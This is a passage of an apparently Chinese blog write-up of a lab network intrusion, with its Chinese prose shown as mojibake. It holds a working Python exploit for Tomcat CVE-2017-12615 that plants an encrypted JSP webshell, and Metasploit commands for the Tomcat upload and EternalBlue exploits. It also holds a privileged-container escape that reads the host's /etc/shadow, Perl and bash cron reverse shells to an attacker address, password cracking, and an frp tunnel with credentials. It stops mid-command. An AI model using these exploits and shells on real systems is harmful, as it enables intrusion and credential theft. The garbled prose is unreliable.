class="hljs plaintext">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 09:39 EST<br>Nmap scan report for 192.168.157.128<br>Host is up (0.0013s latency).<br>Not shown: 996 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)<br>2001/tcp open  http    Jetty 9.2.11.v20150529<br>2002/tcp open  http    Apache Tomcat 8.5.19<br>2003/tcp open  http    Apache httpd 2.4.25<br>MAC Address: 00:0C:29:E3:C5:36 (VMware)<br>Service Info: Host: 172.19.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªå¼€æ”¾ç«¯å£éƒ½æœ‰æœåŠ¡ï¼Œ2001ã€2002ã€2003ï¼Œ22çš„sshæœåŠ¡ä¸€èˆ¬å…ˆè·³è¿‡</p><p>ç„¶åä¸Šfscanæ‰«ä¸€ä¸‹æ¼æ´å§</p><p>éƒ½èƒ½æ‰«å‡ºæ¥ç›¸å…³çš„æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.157.128:2002 open<br>192.168.157.128:2001 open<br>192.168.157.128:2003 open<br>[*] alive ports len is: 3<br>start vulscan<br>[*] WebTitle http://192.168.157.128:2002 code:200 len:11230  title:Apache Tomcat/8.5.19<br>[*] WebTitle http://192.168.157.128:2001 code:200 len:1077   title:Struts2 Showcase - Fileupload sample<br>[+] PocScan http://192.168.157.128:2002 poc-yaml-iis-put-getshell <br>[+] PocScan http://192.168.157.128:2002 poc-yaml-tomcat-cve-2017-12615-rce        <br>[+] PocScan http://192.168.157.128:2001 poc-yaml-struts2_045 poc1<br></code></pre></td></tr></table></figure><blockquote><p>ä¸æ˜¯ä»–æ€ä¹ˆ2003ç«¯å£æ²¡æ‰«å‡ºæ¥æ´å‘¢ğŸ¤”ï¼Œè¿™æŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯æœ‰çš„å§</p></blockquote><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><h2 id="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"><a href="#tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´" class="headerlink" title="tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´"></a>tomcatä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</h2><p>é‚£å°±ä¸ç®¡äº†å…ˆæ¥çœ‹ä¸€ä¸‹ä»–çš„æœåŠ¡å§ï¼Œçœ‹ä¸€ä¸‹tomcat-cve-2017-12615-rceæ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ªtomcatçš„ä»»æ„æ–‡ä»¶å†™å…¥æ¼æ´</p><p>ç›´æ¥ç”¨msfæœä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³çš„tomcatçš„cve</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search cve-2017 tomcat<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115230446678.png" alt="image-20241115230446678"></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªå¯¹åº”çš„rceæ¼æ´ï¼Œé‚£å°±æ‰“ä¸€ä¸‹è¯•è¯•</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/http/tomcat_jsp_upload_bypass<br>show payloads<br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.157.129<br><span class="hljs-built_in">set</span> rhost 192.168.157.128<br><span class="hljs-built_in">set</span> rport 2002<br>run<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½å¼¹ä¸€ä¸ªshellå›æ¥äº†</p><p><img src="https://cdn.clown2024.cn/image-20241115230644472.png" alt="image-20241115230644472"></p><p>ä¸è¿‡è¿™æ ·æ“ä½œèµ·æ¥ä¸å¤ªæ–¹ä¾¿ï¼Œå»æ‰¾payloadä¸Šä¼ ä¸€ä¸ªå†°èçš„shellï¼Œæ–¹ä¾¿æˆ‘ä»¬åç»­ä¸Šä¼ æœ¨é©¬</p><p>ç½‘ä¸Šéšä¾¿æ‰¾åˆ°ä¸€ä¸ªexpï¼š<a href="https://www.cnblogs.com/confidant/p/15440233.html">https://www.cnblogs.com/confidant/p/15440233.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;çº¸æœº&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#éªŒè¯å‚æ•°æ˜¯å¦å®Œæ•´</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#æœ¨é©¬</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#ä¸Šä¼ æœ¨é©¬æ–‡ä»¶</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] ç›®æ ‡åœ°å€:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] ç›®æ ‡åœ°å€:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] æœ¨é©¬ä¸Šä¼ æˆåŠŸ&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] ä¸Šä¼ å¤±è´¥&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#å‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] å‘½ä»¤æ‰§è¡Œé”™è¯¯&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;è¾“å…¥æ‰§è¡Œå‘½ä»¤(quité€€å‡º):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python cve-2017-tomcat.py -u http://192.168.157.128 -p 2002<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115232125447.png" alt="image-20241115232125447"></p><p>ç„¶åå†°èè¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241115232227130.png" alt="image-20241115232227130"></p><p>çœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241115232453454.png" alt="image-20241115232453454"></p><p>å¯ä»¥çœ‹åˆ°dockerç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤åˆ¤æ–­</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep <span class="hljs-string">&#x27;docker&#x27;</span> /proc/1/cgroup<br></code></pre></td></tr></table></figure><h2 id="dockeré€ƒé€¸"><a href="#dockeré€ƒé€¸" class="headerlink" title="dockeré€ƒé€¸"></a>dockeré€ƒé€¸</h2><p>é¢˜ç›®è€ƒç‚¹æœ‰æåˆ°dockeré€ƒé€¸çš„çŸ¥è¯†ç‚¹ï¼Œé‚£å°±çœ‹ä¸€ä¸‹dockeré€ƒé€¸è¦æ€ä¹ˆåˆ©ç”¨ï¼Œå‚è€ƒï¼š<a href="https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html">https://wiki.teamssix.com/CloudNative/Docker/container-escape-check.html</a></p><p>çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/status | grep -qi <span class="hljs-string">&quot;0000003fffffffff&quot;</span> &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is privileged mode&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not privileged mode&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115234729102.png" alt="image-20241115234729102"></p><p>æ ¹æ®æ–‡ç« æ£€æµ‹ä¸‹æ¥åªæœ‰ç‰¹æƒæ¨¡å¼èƒ½å¤Ÿåˆ©ç”¨ï¼Œå…¶ä»–æœåŠ¡å¯èƒ½ä¹Ÿå­˜åœ¨ï¼Œä½†è¿™é‡Œtomcatçš„æœåŠ¡åˆšå¥½èƒ½åˆ©ç”¨ï¼Œå°±ç»§ç»­è¿›è¡Œä¸‹å»</p><p>æŸ¥çœ‹æŒ‚è½½ç£ç›˜è®¾å¤‡</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235254326.png" alt="image-20241115235254326"></p><p>åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å®¿ä¸»æœºæ–‡ä»¶æŒ‚è½½åˆ° &#x2F;test ç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> /test &amp;&amp; mount /dev/sda1 /test<br></code></pre></td></tr></table></figure><p>å°è¯•è®¿é—®å®¿ä¸»æœº shadow æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°æ­£å¸¸è®¿é—®</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /test/etc/shadow<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241115235506075.png" alt="image-20241115235506075"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å†™å…¥å®šæ—¶ä»»åŠ¡åå¼¹shellç„¶åæ‹¿åˆ°çš„æƒé™ä¹Ÿæ˜¯å®¿ä¸»æœºçš„rootæƒé™</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> $<span class="hljs-string">&#x27;* * * * * perl -e \&#x27;</span>use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;192.168.157.129&quot;</span>;<span class="hljs-variable">$p</span>=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;open(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);&#125;;\&#x27;<span class="hljs-string">&#x27; &gt; /test/var/spool/cron/crontabs/root</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸ºäº†æ–¹ä¾¿æ“ä½œè¿˜æ˜¯çœ‹ä¸€ä¸‹èƒ½ä¸èƒ½å†™sshå…¬é’¥æ¥è¿æ¥å§</p><p>å…ˆçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰.sshæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name .ssh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116000516621.png" alt="image-20241116000516621"></p><p>å‘ç°äº†ubuntuçš„.sshæ–‡ä»¶åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/test/home/ubuntu/.ssh<br></code></pre></td></tr></table></figure><p>é‚£å°±å¯ä»¥å†™sshå…¬é’¥ç„¶åè¿œç¨‹ç™»å½•äº†</p><p>ç”Ÿæˆæœ¬åœ°å¯†é’¥å¯¹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>ä»¥å‰ç”Ÿæˆè¿‡å¯ä»¥ç›´æ¥ç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241116000827045.png" alt="image-20241116000827045"></p><p>å†™è¿›authorized_keys</p><p><img src="https://cdn.clown2024.cn/image-20241116001043435.png" alt="image-20241116001043435"></p><p>æ¬¸æˆ‘å»å¿˜è®°äº†è¿™æ˜¯ä»…ä¸»æœºæ¨¡å¼äº†ï¼Œæˆ‘termiusè¿ä¸äº†ï¼Œåªèƒ½ç”¨kaliçš„sshï¼Œè€Œä¸”æˆ‘è¯•äº†ä¸€ä¸‹è¿˜è¿ä¸ä¸Šå°±é€†å¤©ï¼Œè¿˜æ˜¯è¦æˆ‘è¾“å…¥å¯†ç ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘æ ¼å¼å†™é”™äº†ï¼ˆæˆ‘å‘ç°ç›´æ¥ä¼ ä¹Ÿä¸è¡Œï¼‰</p><p>é‚£å°±è¿˜æ˜¯åå¼¹shellå§</p><p><img src="https://cdn.clown2024.cn/image-20241116003807417.png" alt="image-20241116003807417"></p><p>æ€ªäº†ï¼Œå†™è¿›å»åˆå¼¹ä¸è¿‡æ¥äº†ï¼Œçº¢æ¸©äº†ğŸ˜¡</p><p>æ¢æˆbashå¼¹ä¸€ä¸‹çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.157.129/8888 0&gt;&amp;1&quot;</span> &gt; /test/var/spool/cron/crontabs/root<br></code></pre></td></tr></table></figure><p>çº¢æ¸©äº†è¿˜æ˜¯ä¸è¡Œ</p><p>é‚£å°±åªèƒ½ç”¨johnå»çˆ†ä¸€ä¸‹å¯†ç äº†</p><p>æŠŠ&#x2F;etc&#x2F;shadowçš„å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œç„¶åç›´æ¥johnçˆ†ç ´</p><p><img src="https://cdn.clown2024.cn/image-20241116102516524.png" alt="image-20241116102516524"></p><p>è½»æ¾çˆ†å‡ºå¯†ç ä¸ºubuntuï¼Œç„¶åç”¨sshè¿œç¨‹ç™»å½•ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ssh ubuntu@192.168.157.128<br></code></pre></td></tr></table></figure><p>ç„¶åçœ‹ä¸€ä¸‹eth1çš„åœ°å€ä¿¡æ¯ï¼Œå°±æ˜¯å†…ç½‘åœ°å€çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig eth1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111716201.png" alt="image-20241116111716201"></p><p>å¯ä»¥çŸ¥é“å†…ç½‘åœ°å€192.168.183.128</p><h2 id="struts2æ¼æ´"><a href="#Struts2æ¼æ´" class="headerlink" title="Struts2æ¼æ´"></a>Struts2æ¼æ´</h2><p>2001æ˜¯ä¸€ä¸ªstruts2æœåŠ¡ï¼Œç›´æ¥ä¸Šå·¥å…·ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32">https://github.com/abc123info/Struts2VulsScanTools/releases/tag/v19.32</a></p><p>ç›´æ¥èƒ½æ‰«å‡ºrceæ¼æ´</p><p><img src="https://cdn.clown2024.cn/image-20241116230437845.png" alt="image-20241116230437845"></p><p>é‚£åˆ©ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œå¹²å•¥éƒ½è¡Œäº†ï¼Œé©¬ä¹Ÿéšä¾¿ä½ ä¸Šä¼ ï¼Œå°±ä¸å¤šæ¼”ç¤ºäº†</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="frpåå‘ä»£ç†"><a href="#frpåå‘ä»£ç†" class="headerlink" title="frpåå‘ä»£ç†"></a>frpåå‘ä»£ç†</h2><p>ç°åœ¨æˆ‘ä»¬å‘¢å°±æ‹¿ä¸‹ä¸€å°è·³æ¿æœºäº†ï¼Œä¸ºäº†æ–¹ä¾¿é¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹frpï¼Œè¿™é‡Œæ­ä¸ªä»£ç†è¿›å»ï¼Œç„¶åå¯ä»¥ç›´æ¥æ‰«ä¸€ä¸‹å†…ç½‘</p><p>å‚è€ƒæ•™ç¨‹ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/03.%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</a></p><p>å…ˆå°†æœ¬åœ°çš„frpä¸Šä¼ åˆ°ubuntuçš„æœºå™¨ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">scp -r frp ubuntu@192.168.157.128:/home/ubuntu/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116105558626.png" alt="image-20241116105558626"></p><blockquote><p>è¿™é‡Œæœ‰ç‚¹è¦æ³¨æ„ï¼Œä»–ä¸Šä¼ çš„æ—¶å€™ä¼šç›´æ¥æ‰¾ä½ å½“å‰ç›®å½•ä¸‹çš„frpç›®å½•ï¼Œæ‰€ä»¥å¦‚ä¸Šå›¾è¦ç°åœ¨ubuntuç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªfrpç›®å½•</p></blockquote><p>kaliçš„frpæœåŠ¡ç«¯é…ç½®frps.toml</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">bindPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><span class="hljs-comment">#portï¼Œtokenè‡ªå®šä¹‰ ä¿æŒå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¸€è‡´å³å¯</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨æœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frps -c ./frps.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116110345584.png" alt="image-20241116110345584"></p><p>ubuntuçš„å®¢æˆ·ç«¯frpc.tomlé…ç½®</p><figure class="highlight toml"><table><tr><td class="code"><pre><code class="hljs toml"><span class="hljs-attr">serverAddr</span> = <span class="hljs-string">&quot;192.168.157.129&quot;</span> <span class="hljs-comment"># æ”¹ä¸º VPS çš„ IP åœ°å€</span><br><span class="hljs-attr">serverPort</span> = <span class="hljs-number">49378</span><br><span class="hljs-attr">auth.token</span> = <span class="hljs-string">&quot;helloxx.6haha7789&quot;</span><br><br><span class="hljs-section">[[proxies]]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;plugin_socks5&quot;</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attr">remotePort</span> = <span class="hljs-number">60051</span><br><span class="hljs-section">[proxies.plugin]</span><br><span class="hljs-attr">type</span> = <span class="hljs-string">&quot;socks5&quot;</span><br><span class="hljs-attr">username</span> = <span class="hljs-string">&quot;0HDFt16cLQJCB&quot;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&quot;JTN276Gp1A&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨å®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.toml<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116111031630.png" alt="image-20241116111031630"></p><p>ç„¶åç°åœ¨å°±èƒ½é€šè¿‡60051ç«¯å£èµ°socks5ä»£ç†è®¿é—®å†…ç½‘äº†</p><p>å†é…ç½®ä¸€ä¸‹proxychains4å·¥å…·çš„é…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure><p>é…ç½®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[ProxyList]<br># add proxy here ...<br># meanwile<br># defaults set to &quot;tor&quot;<br># socks4        127.0.0.1 9050<br># socks5  192.168.172.132 7777<br># socks5 127.0.0.1 8989<br>socks5 127.0.0.1 60051 0HDFt16cLQJCB JTN276Gp1A<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸€å¼€å§‹socks5å¿˜è®°åŠ ä¸Šç”¨æˆ·åå’Œå¯†ç äº†ï¼Œå¯¼è‡´msfè®¿é—®çš„æ—¶å€™è¢«æ‹’ç»è¿æ¥äº†</p></blockquote><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>é‚£å°±ç›´æ¥ä¸Šfscanæ‰«å†…ç½‘äº†</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains ./fscan -h 192.168.183.1/24<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºçš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p>å­˜æ´»ä¸»æœº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">(icmp) Target 192.168.183.1   is alive<br>(icmp) Target 192.168.183.130 is alive<br>(icmp) Target 192.168.183.128 is alive<br>(icmp) Target 192.168.183.129 is alive<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¶ä»–ä¸¤å°çš„åœ°å€éƒ½æ‰«å‡ºæ¥äº†</p><p>ç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.183.128:22 open<br>192.168.183.1:7680 open<br>192.168.183.129:445 open<br>192.168.183.130:445 open<br>192.168.183.129:139 open<br>192.168.183.1:445 open<br>192.168.183.130:139 open<br>192.168.183.129:135 open<br>192.168.183.1:139 open<br>192.168.183.130:135 open<br>192.168.183.1:135 open<br>192.168.183.130:88 open<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*]192.168.183.130<br>   [-&gt;]WIN-ENS2VR5TR3N<br>   [-&gt;]192.168.183.130<br>[*] NetInfo <br>[*]192.168.183.129<br>   [-&gt;]TESTWIN7-PC<br>   [-&gt;]192.168.183.129<br>[+] MS17-010 192.168.183.129    (Windows 7 Enterprise 7601 Service Pack 1)<br>[+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)                   <br>[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1<br></code></pre></td></tr></table></figure><p>win7çš„ä¸»æœºæœ‰MS17-010æ°¸æ’ä¹‹è“æ¼æ´ï¼ŒwinServer2008åº”è¯¥æ˜¯åŸŸæ§ä¹Ÿæœ‰ä¸€ä¸ªæ°¸æ’ä¹‹è“</p><p>é‚£å°±å…ˆæ‰“win7å§ç›´æ¥</p><h2 id="æ‰“win7"><a href="#æ‰“win7" class="headerlink" title="æ‰“win7"></a>æ‰“win7</h2><p>é€šè¿‡porxychainså¯åŠ¨msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116174820036.png" alt="image-20241116174820036"></p><p>ç„¶åä¸Šæ°¸æ’ä¹‹è“çš„æ‰«ææ¨¡å—è¯•ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯æµ‹è¯•èƒ½ä¸èƒ½é€š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116175834529.png" alt="image-20241116175834529"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ‰«å‡ºæ¥äº†ms17-010ï¼Œé‚£å°±ç›´æ¥å¼€æ‰“ï¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="hljs-comment">#å› 